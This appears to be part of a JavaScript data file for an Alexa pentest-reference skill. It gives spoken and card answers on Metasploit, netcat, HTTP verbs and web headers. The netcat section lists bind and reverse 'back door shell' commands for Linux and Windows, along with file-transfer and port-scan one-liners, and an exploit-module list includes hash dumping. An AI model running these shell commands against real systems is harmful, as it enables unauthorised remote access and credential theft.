	"meterpreter": {"speech" : "Meterpreter is a dynamically extensible metasploit payload that can DLL inject into a process on the target machine. It has many options for pillaging and pivoting.","card" : "Meterpreter is a metasploit payload that runs as a DLL in a process on the target machine. It has many options for pillaging and pivoting."},
	"msf venom": {"speech" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection.","card" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection."},	
	"m s f venom": {"speech" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection.","card" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection."},	
	"venom": {"speech" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid anti virus detection.","card" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection."},	
	"set params" : {"speech" : "At the MSF console prompt enter set followed by a space then the name of the option followed by a space and then the value you wish to set.", "card" : "msf> set optionname value"}
} };

const netcat = { "NETCAT_EN_US": {
	"shell": { "speech": "To start a Netcat shell. At the command prompt, type <prosody rate='95%'>n c space dash L dash P </prosody>followed by the port number you want to listen on.", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"transfer file": { "speech": "To transfer a file by NetCat, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on. Follow that with a space and a greater-than symbol, another space and the file-name you wish to push when a remote user connects</prosody>", "card": "nc -l -p [LocalPort] > [outfile]"},
	"transfer a file": { "speech": "To transfer a file by NetCat, at the command prompt type <prosody rate='95%'>n c space dash L dash P  followed by a space and the port you want to listen on. Follow that with a space and a greater-than symbol, another space and the file-name you wish to push when a remote user connects</prosody>", "card": "nc -l -p [LocalPort] > [outfile]"},
	"file transfer": { "speech": "To transfer a file by NetCat, at the command prompt type <prosody rate='95%'>n c space dash L dash P  followed by a space and the port you want to listen on. Follow that with a space and a greater-than symbol, another space and the file-name you wish to push when a remote user connects</prosody>", "card": "nc -l -p [LocalPort] > [outfile]"},
	"proxy" : {"speech": "The syntax for this one is more difficult. You can create a net-cat proxy by following the syntax shown in the Alexa app.", "card": "To Start, create a FIFO named pipe. At the command prompt: cd /tmp [enter] mknod backpipe p [enter] nc -l -p [LocalPort] 0<backpipe | nc [TargetIPAddr] [port] | tee backpipe"},
	"connect" : {"speech": "at the command prompt type <prosody rate='95%'>n c followed by a space then your target IP address. After another space enter the port number you wish to connect to</prosody>", "card": "nc [TargetIPAddress] [Port]"},
	"client" : {"speech": "at the command prompt type <prosody rate='95%'>n c followed by a space then your target IP address. After another space enter the port number you wish to connect to</prosody>", "card": "nc [TargetIPAddress] [Port]"},
	"simple client" : {"speech": "at the command prompt type <prosody rate='95%'>n c followed by a space then your target IP address. After another space enter the port number you wish to connect to</prosody>", "card": "nc [TargetIPAddress] [Port]"},
	"listener": { "speech": "To create a NetCat Listener, at the command prompt type <prosody rate='95%'>n c dash lower-case l space dash P followed by a space and the port you want to listen on. Use an upper-case L to continue listening</prosody>", "card": "nc -l -p [LocalPort] //Or you can use// nc -L -p [LocalPort] //to stay in listening mode."},
	"file push": { "speech": "To create a NetCat file-pushing client, at the command prompt type <prosody rate='95%'>n c space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"file pull": { "speech": "To create a NetCat file-pulling client, at the command prompt type <prosody rate='95%'>n c space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"file pusher": { "speech": "To create a NetCat file-pushing client, at the command prompt type <prosody rate='95%'>n c space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"file puller": { "speech": "To create a NetCat file-pulling client, at the command prompt type <prosody rate='95%'>n c space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"file sender": { "speech": "To create a NetCat file-pushing client, at the command prompt type <prosody rate='95%'>n c space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"file retriever": { "speech": "To create a NetCat file-pulling client, at the command prompt type <prosody rate='95%'>n c space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"push a file": { "speech": "To create a NetCat file-pushing client, at the command prompt type <prosody rate='95%'>n c space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"pull a file": { "speech": "To create a NetCat file-pulling client, at the command prompt type <prosody rate='95%'>n c space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"send a file": { "speech": "To create a NetCat file-pushing client, at the command prompt type <prosody rate='95%'>n c space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"get a file": { "speech": "To create a NetCat file-pulling client, at the command prompt type <prosody rate='95%'>n c space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"retrieve a file": { "speech": "To create a NetCat file-pulling client, at the command prompt type <prosody rate='95%'>n c space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"upload a file": { "speech": "To create a NetCat file-pushing client, at the command prompt type <prosody rate='95%'>n c space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"download a file": { "speech": "To create a NetCat file-pulling client, at the command prompt type <prosody rate='95%'>n c space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded</prosody>", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
	"make a port scanner": { "speech": "To create a NetCat port scanner, at the command prompt type <prosody rate='95%'>n c space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number</prosody>", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
	"start a port scan": { "speech": "To create a NetCat port scanner, at the command prompt type <prosody rate='95%'>n c space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number</prosody>", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
	"create a port scanner": { "speech": "To create a NetCat port scanner, at the command prompt type <prosody rate='95%'>n c space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number</prosody>", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
	"do a port scan": { "speech": "To create a NetCat port scanner, at the command prompt type <prosody rate='95%'>n c space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number</prosody>", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
	"a port scan": { "speech": "To create a NetCat port scanner, at the command prompt type <prosody rate='95%'>n c space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number</prosody>", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
	"port scan": { "speech": "To create a NetCat port scanner, at the command prompt type <prosody rate='95%'>n c space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number</prosody>", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
	"options": { "speech": "command flags are: <prosody rate='95%'>dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity</prosody>", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
	"command options": { "speech": "command flags are: <prosody rate='95%'>dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity</prosody>", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
	"command line options": { "speech": "command flags are: <prosody rate='95%'>dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity</prosody>", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
	"flags": { "speech": "command flags are: <prosody rate='95%'>dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity</prosody>", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
	"command flags": { "speech": "command flags are: <prosody rate='95%'>dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity</prosody>", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
	"banner grabber": { "speech": "To create a NetCat banner grabber, follow the syntax on the response card in the Alexa app.", "card": "echo \"\" | nc -v -n -w1 [TargetIPAddr] [start_port]-[end-port]"},
	"make a banner grabber": { "speech": "To create a NetCat banner grabber, follow the syntax on the response card in the Alexa app.", "card": "echo \"\" | nc -v -n -w1 [TargetIPAddr] [start_port]-[end-port]"},
	"create a banner grabber": { "speech": "To create a NetCat banner grabber, follow the syntax on the response card in the Alexa app.", "card": "echo \"\" | nc -v -n -w1 [TargetIPAddr] [start_port]-[end-port]"},
	"listening back door shell on linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space and forward slash bin forwardslash bash</prosody>", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"listening back door shell on windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc -l -p [LocalPort] -e cmd.exe"},
	"listening back door shell for linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space and forward slash bin forwardslash bash</prosody>", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"listening back door shell for windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc -l -p [LocalPort] -e cmd.exe"},
	"reverse back door shell for linux": { "speech": "To create reverse back door shell with NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space followed by your IP Address followed by a space and the port you want to connect to, followed by a space dash E space and forward slash bin forwardslash bash</prosody>", "card": "nc [YourIPAddr] [LocalPort] -e /bin/bash"},
	"reverse back door shell for windows": { "speech": "To create a reverse back door shell with NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space followed by your IP Address followed by a space and the port you want to connect to, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc [YourIPAddr] [LocalPort] -e cmd.exe"},
	"create a back door shell for linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space forward slash bin forwardslash bash</prosody>", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"create a back door shell for windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc -l -p [LocalPort] -e cmd.exe"},
	"create a back door shell on linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space and forward slash bin forwardslash bash</prosody>", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"create a back door shell on windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc -l -p [LocalPort] -e cmd.exe"},
	"back door shell for linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space forward slash bin forwardslash bash</prosody>", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"back door shell for windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc -l -p [LocalPort] -e cmd.exe"},
	"back door shell on linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space and forward slash bin forwardslash bash</prosody>", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"back door shell on windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc -l -p [LocalPort] -e cmd.exe"},
// sometimes Alexa strays far from the slots defined and just guesses weird crap. This catches one of those.
	"pack door shell for linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space forward slash bin forwardslash bash</prosody>", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"pack door shell for windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc -l -p [LocalPort] -e cmd.exe"},
	"pack door shell on linux": { "speech": "To create listening NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space and forward slash bin forwardslash bash</prosody>", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"pack door shell on windows": { "speech": "To create listening NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space dash L dash P followed by a space and the port you want to listen on, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc -l -p [LocalPort] -e cmd.exe"},
	"reverse back door shell on linux": { "speech": "To create reverse back door shell with NetCat shell on Linux, at the command prompt type <prosody rate='95%'>n c space followed by your IP Address followed by a space and the port you want to connect to, followed by a space dash E space and forward slash bin forwardslash bash</prosody>", "card": "nc [YourIPAddr] [LocalPort] -e /bin/bash"},
	"reverse back door shell on windows": { "speech": "To create a reverse back door shell with NetCat shell on Windows, at the command prompt type <prosody rate='95%'>n c space followed by your IP Address followed by a space and the port you want to connect to, followed by a space dash E space folowed by C M D dot E X E</prosody>", "card": "nc [YourIPAddr] [LocalPort] -e cmd.exe"}
} };

const exploitservices = { "EXPLOITSVCS_EN_US": {
  "ice cast": {"speech": ""},
  "S M B": {"speech": ""},
  "F T P": {"speech": ""},
  "R D P": {"speech": ""}
}
};

const exploitmodules = { "EXPLOITMODS_EN_US": {
	// list processes list files, dump hashes, get system, whoami, etc.
  "list processes": {"cmd": "list processes"},
  "list files": {"cmd": "list files"},
  "dump hashes": {"cmd": "dump hashes"},
  "get system": {"cmd": "get system"},
  "who am i": {"cmd": "whoami"}
}
};

const httpverbs = { "HTTPVERBS_EN_US": {
	"all": "Verbs include: get, head, post, put, patch, delete, connect, options and trace. A number of other verbs are used in content delivery, web-Dav and version control.",
	"get": "A GET request fetches data pointed to by a URL. GET parameters are visible in the URL and are stored in the browser history. GET acts as a Read in the context of restful web services. GET returns a 200 OK or 404 not found.",
	"post" : "Post, requests the content of a URL with parameters passed in the body of the request. Passed parameters are not visible in browser history. In Restful web services POST is similar to Create and will return an error 409 if the resource already exists.",
	"put" : "Put, replaces remote data with the current contents of the payload. PUT is used in restful web services as an Update or Replace function. It a restful context it returns 200 upon success, 204 no content if invalid or 404 not found.",
	"delete" : "Delete, was intended for deletion of files if the server supports the verb, however it is generally used in restful web services to delete a specific record. A restful delete operation returns a 200 ok if successful or a 404 not found if the ID was not found.",
	"options" : "Options typically fetches the communications methods for a particular resource.",
	"trace" : "Trace is intended to perform a loop-back test along the path to the target resource.",
	"connect" : "Connect establishes a tunnel to the server which is providing the resource.",
	"xml http request" : "XML HTTP request makes a request to a web resource which is done asynchronously. XML HTTP requests will have what is called a pre-flight check to validate permission to access the domain of the requested resource.",
	"x m l http request" : "XML HTTP request makes a request to a web resource which is done asynchronously. XML HTTP requests will have what is called a pre-flight check to validate permission to access the domain of the requested resource.",
	"patch" : "Patch was intended to apply partial modifications to a resource. In restful web services Patch can be used to update or modify a record.  It a restful context it returns 200 upon success, 204 no content if invalid or 404 not found.",
	"prop find" : "Prop find web-dav verb returns information about an outlook resource. It can have a depth header setting of 0 or 1. 0 returns properties for the resource only. One will return properties for the resource and it's children.",
	"prop patch" : "Prop patch web-dav verb patches or updates properties of a resource in Outlook web resources.",
	"notify" : "Notify is a web-dav verb that can be used to send a notification to all clients.",
	"b copy" : "B copy is a web-dav verb that performs a copy on a resource but must have a request body. It requires an XML target element.",
	"b move" : "B move is a web-dav verb that performs a move on a resource but must include a request body. The request body contains an XML target element.",
	"b prop find" : "B prop find is a web-dav verb that finds a property of a resource but includes a request body. The request body contains an XML target element.",
	"b prop patch" : "B prop patch is a web-dav verb that updates a resource. It requires a request body which contains an XML target element.",
	"copy" : "The copy web-dav verb creates a copy of an object. It can apply to a single resource or to all children of the resource given a depth header value.",
	"b delete" : "The delete web-dav verb deletes a copy of an object. It can have a depth header set for deleting child objects as well.",
	"lock" : "The lock web-dav verb performs a write-lock on a resource. It can have a depth header set to apply to child objects as well.",
	"m k col" : "The M K col web-dav verb creates a new collection at the resource location.",
	"move" : "The move web-dav verb moves a resource. It may have a depth header set to indicate if child items are moved as well.",
	"poll" : "The poll web-dav verb can be used to determine if a client has received an event notification or query for what events have fired.",
	"search" : "The search web-dav verb is used to search a Microsoft exchange store for a resource.",
	"subscribe" : "The subscribe web-dav verb is used to create a subscription to a resource.",
	"unlock" : "The unlock web-dav verb is used to unlock a resource at the request URI that is locked.",
	"unsubscribe" : "The unsubscribe web-dae verb is used to end a subscription to a resource.",
	"x ms enum atts" : "The x M S enum atts method is used to enumerate email attachment properties in an outlook web.",
	"x m s enum atts" : "The x M S enum atts method is used to enumerate email attachment properties in an outlook web."
	} };
	
const webheaders = { "WEBHEADERS_EN_US": {
	"all": "Request headers and response headers. There are headers to prevent xss, cross origin requests and other security features. Some headers have to do with the referer and information about the user-agent. Unfortunately, a complete list would take too long to read.",
	"accept" : "The accept request header notifies the server of what mime types the browser supports.",
	"accept charset" : "The accept-char set request header notifies the server what character sets the browser understands.",
	"accept char set" : "The accept-char set request header notifies the server what character sets the browser understands.",
	"accept encoding" : "The accept-encoding request header tells the server which encodings and compression the browser will accept, like G zip, deflate etcetera.",
	"accept language" : "The accept-language request header advertises which languages the browser is able to understand.",
	"accept ranges" : "The accept-ranges response header is used by the server to tell the browser if it will accept partial requests.",
	"access control allow credentials" : "The access-control-allow-credentials response header indicates whether or not the response to the request can be written to the page. It can be used if the returned value is true. This header can be used in pre-flight requests to validate whether credentials can be used as part of an XHR request.",
	"access control allow headers" : "The access-control-allow-credentials header is a response header which is used in pre-flight requests to determine which HTTP headers will be available via the Access-control-expose-headers header when making the XHR request.",
	"access control allow methods" : "The access-control-allow-methods header is a response header which indicates what methods are allowed when fetching the resource in the response to a preflight request.",
	"access control allow origin" : "The access-control-allow-origin header is a response header which tells the browser whether the response can be shared with resources with the given origin.",
	"access control expose headers" : "The access-control-expose-headers response header lets the requestor know which headers can be exposed as part of the response by listing them for the browser.",
	"access control max age" : "The access-control-max-age header is a response header that tells the browser how long the results of a pre-flight request can be cached.",
	"access control request headers" : "The access-control-request-headers is a request header that is used when making a pre-flight request to notify the server which HTTP headers will be used during the XHR request.",
	"access control request method" : "The access-control-request-method header is a request header that is used when making pre-flight requests to notify the server which HTTP method will be used when making the request. This header is required because the pre-flight check uses the options verb and does not use the same method as the final request.",
	"age" : "The age header contains the time in seconds that the item has been cached.",
	"cache control" : "The cache-control header is a general header that specifies cache options for either requests and responses but both client and server are required to provide this header as needed.",
	"connection" : "Connection is a general header that specifies whether the network connection stays open after the current transaction finishes. If the value is keep-alive then the connection is persistent.",
	"content disposition" : "The content-disposition response header indicates whether the content should be displayed in-line in the browser. In a multi-part form data body the HTTP content disposition general header can be used on a part of the multi-part body to give added information to that data segment.",
	"content encoding" : "The content-encoding header is an entity header that specifies compression of the media-type. It can tell the client how to decode in order to obtain the media type specified by the content-type header.",
	"content language" : "The content-language header is an entity header that describes the languages to be consumed by the client. If no content language header is included then the content is assumed to be for all languages.",
	"content length" : "The content-length header is an entity header that specifes the size of the entity body in a decimal number of octets and is intended to be evaluated by the recipient.",
	"content location" : "The content-location header tells the browser of an alternate location for the data. Content-Location usually returns the direct URL of the resource being transmitted during content negotiation.",
	"content security-policy" : "The content-security-policy header is a response header that provides a means for controlling what content sources and domains are allowed to serve trusted site content. It also can control cross site script and many other security related settings.",
	"content security-policy-report-only" : "The conent-security-policy-report-only header will allow a web site developer to test but not enforce aspects of policy that will later be used in the Content Security Policy header. Activities that would be blocked are reported.",
	"content type" : "The content-type header helps test policies by monitoring policy effects in a detect mode versus preventing the activity in question.",
	"cookie" : "The cookie header contains stored HTTP cookies that were sent by the server using the set dash cookie header.",
	"cookie two" : "The cookie 2 header is obsolete but may be honored by some browsers for backward compatability. Most browser will ignore it and use the cookie header only.",
	"d n t" : "The D N T header is the do not track request header, telling the server the user values privacy over usability while interacting with the site.",
	"date" : "The date header is a general header which stores the date and time that the message was created.",
	"e tag" : "The E tag header is a response header which identifies a specific version of a requsted object by effectively being a hash value of a resource. This allows the resource to be uniquely identified and it improves cache efficiency because the server does not have to resend the whole response if the content has not changed.",
	"expires" : "The expires header provides the date and time after which the content is expired or needs to be re-fetched",
	"from" : "The from header is composed of an email address for a user who controls the browser or user agent. If you program a bot, it should include the From header so you can be notified if the bot traffic is problematic.",
	"host" : "The host header specifies the fully qualified domain name of the server and may include the port number the server is listening on.",
	"if match" : "The if-match header is a request header which returns content if the resource etag matches one specified in the request. It can be used as a version control mechanism limiting uploads that would be duplicate or it can be used with a Range header to ensure that new ranges requested come from the same resource as previously checked.",
	"if modified since" : "The if-modified-since header is a request header. The server will return the resource with a 200 OK if the resource was modified last after the date specified, otherwise it returns a 304.",
	"if none match" : "The if-none-match header is a request header. The server will only send back a 200 OK if none of the requested resources match the e-tags provided.",
	"if range" : "The if-range header is a request header that is conditional. If the condition is met the resource is returned. This can be used with e tag or last dash modified headers.",
	"if unmodified since" : "The if-unmodified-since header is a request header. It will return the resource if the condition is met. If the resource is modified since the date then the server returns a 412.",
	"keep alive" : "The keep-alive header is a general header and is not standard. Do not use in production sites as it will not work for all users. The keep alive header tries to instruct the server on how to maintain the connection and what a maximum time-out period may be.",
	"last modified" : "The last-modified response header details the date and time the server resource was last modified.",
	"location" : "The location header is a response header that tells the browser which page to redirect to. It is only effective when returned with a 300 to 399 range response code",
	"origin" : "The origin request header returns the name of the server that is serving the requested content. This header is sent with POST and with CORS requests. It is similar to the referer header but does not show path information.",
	"pragma" : "The pragma header is a general header. It is used for backward compatability with HTTP version 1 caches if cache-control headers are not specified.",
	"public key pins" : "The public-key-pins header is a response header that associates a public key with a specific web server to reduce the risk of MITM attacks. If a pin DOS is attempted using fake keys, the browser should ignore the pin request.",
	"public key pins report only" : "The public-key-pins-report-only response header sends a reports of pinning errors to the report URI specified in the header. This header will not enforce pinning, but only report problems with it. As such, it can be used to test pinning.",
	"referer" : "The referer header is a request header that specifies the address of the previoius page from which the current link was followed.",
	"referrer policy" : "The referer-policy header specifies which referrer information should be included in requests.",
	"retry after" : "The retry-after header is a response header that tells the browser how long it should wait before making a follow-up request. When sent a 503 it specifies how long the browser should wait for the unavailable resource. If send a 301, it will tell the browser the minimum time to wait before redirecting.",
	"server" : "The server header indicates the server software type and possibly version number. The server header can tell an attacker what technologies are running and what may be vulnerable based on version numbers.",
	"set cookie" : "The set-cookie header is used to send cookies from the server to the browser.",
	"set cookie two" : "The set-cookie 2 response header has been deprecated and is not supported by modern browsers.",
	"strict transport security" : "The strict transport security header is a response header that tells the browser that it should only browse the server using HTTPS rather than HTTP.",
	"te" : "The TE header is a request header that determines the transfer encodings the browser can process. Chunked encoding is always accepted by default in modern browsers.",
	"tk" : "The TK header is a response header that provides tracking status for requests. Statuses include, exclamation, question mark, G, N for no tracking. T stands for tracking. C is tracking with consent. D equals disregard do not track. etc.",
	"t e" : "The TE header is a request header that determines the transfer encodings the browser can process. Chunked encoding is always accepted by default in modern browsers.",
	"t k" : "The TK header is a response header that provides tracking status for requests. Statuses include, exclamation, question mark, G, N for no tracking. T stands for tracking. C is tracking with consent. D equals disregard do not track. etc.",
	"trailer" : "The trailer header is a response header that allows for the inclusion of additional fields at the end of chuncked messages which may contain dynamically generated data appended to the message body, like CRC checks, digital signatures or post processing indicators.",
	"transfer encoding" : "The transfer-encoding header is similar to content dash encoding header but is specific to each discreet message. It often is returned in response to a HEAD request indicating how it would return the corresponding get request. Examples are chunked, deflate, gzip etcetera.",
	"upgrade insecure requests" : "The upgrade-insecure-requests header is a request header that tells the server that the browser wants to enable encryption if possible. True equals the value of 1 in this case.",
	"user agent" : "The user-agent header is a request header that tells the server what kind of browser is connecting to it. User agent strings can be altered. Do not fully rely on the information provided.",
	"vary" : "The vary response header helps decide how to match future request headers to decide whether a cached response can be used versus requesting a new copy from the server.",
	"via" : "The via header is a general header added by proxies. It can be either in request or response headers. I helps in traffic issues and identifying the protocol options of the sending nodes that help serve and proxy the reqeusts.",
	"warning" : "The warning header is a general header that contains information about errors or problems. Multiple warnings may be queued in the same response. For example, warn dash agent, warn dash text, warn dash date, etc.",
	"x content type options" : "The X-content-type options response header is used to indicate mime types noted in the content type header should not be changed. This header was intended to block mime types from being changed to executable types. The no sniff setting is intended to prevent content type alteration as part of an attack.",
	"x. content type options" : "The X-content-type options response header is used to indicate mime types noted in the content type header should not be changed. This header was intended to block mime types from being changed to executable types. The no sniff setting is intended to prevent content type alteration as part of an attack.",
	"x d n s prefetch control" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"d n s prefetch" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"xcontent type options" : "The X-content-type options response header is used to indicate mime types noted in the content type header should not be changed. This header was intended to block mime types from being changed to executable types. The no sniff setting is intended to prevent content type alteration as part of an attack.",
	"xdns prefetch control" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"dns prefetch" : "The X-DNS-Prefetch-control header is a response header. It controls DNS prefetching which browsers use to do domain name resolution on URLs the user follows or referenced resources from the web document itself. This feature is intended to increase performance by making a page cache the IPs for domains referred to in the document.  Possible values are on or off.",
	"x frame options" : "The X-frame-options header is intended to prevent the browser from rendering the page within an iframe to thwart iframe overlay or content replacement patterns common to watering hole attacks",
	"x. frame options" : "The X-frame-options header is intended to prevent the browser from rendering the page within an iframe to thwart iframe overlay or content replacement patterns common to watering hole attacks",
